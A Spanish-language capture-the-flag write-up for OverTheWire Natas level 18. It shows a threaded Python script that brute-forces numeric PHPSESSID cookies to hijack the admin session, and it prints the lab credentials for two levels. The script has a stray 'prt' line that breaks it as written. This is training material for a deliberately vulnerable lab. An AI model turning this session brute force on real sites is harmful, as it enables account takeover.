# Natas 18

#### URL: natas18.natas.labs.overthewire.org
#### Credenciales: natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ

Vemos que si la sesion tiene la propiedad "admin" con valor 1 entonces es una sesion de administrador:

``` php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

La sesion se almacena en una cookie cuyo valor es un numero entre 1 y 640:

``` php
$maxid = 640; // 640 should be enough for everyone

function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */

function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
```

Probamos con la cookie con valor en este rango de valores hasta encontrar la del administrador
``` python
from base64 import b64encode
import requests
import threading

URL="http://natas18.natas.labs.overthewire.org/index.php"
lastQuery=""

def tryID(n):
    global lastQuery
    headers = {'Authorization': f'Basic {b64encode(b'natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ').decode()}', 'Cookie':f'PHPSESSID={n}'}
    data = 'username=admin&password=admin'
    x = requests.post(URL,data=data,headers=headers)
    prt
    if "You are logged in as a regular user" not in x.text:
        print(f"Admin PHPSESSION ID: {n}")
    lastQuery=x.text

for i in range(1,640+1):
    t = threading.Thread(target=tryID,args=(i,))
    t.start()
```    

``` python 
python3 script.py
Admin PHPSESSION ID: 119
```

Nos cambiamos la cookie de sesion y obtenemos las credenciales:

![2025-03-20-181317_1364x329_scrot](https://github.com/user-attachments/assets/4f8e762a-9ffa-4f57-8249-04e7975051a9)

`natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`

PD: No esperes a que terminen todos los hilos, paralo una vez encuentre la ID correcta.

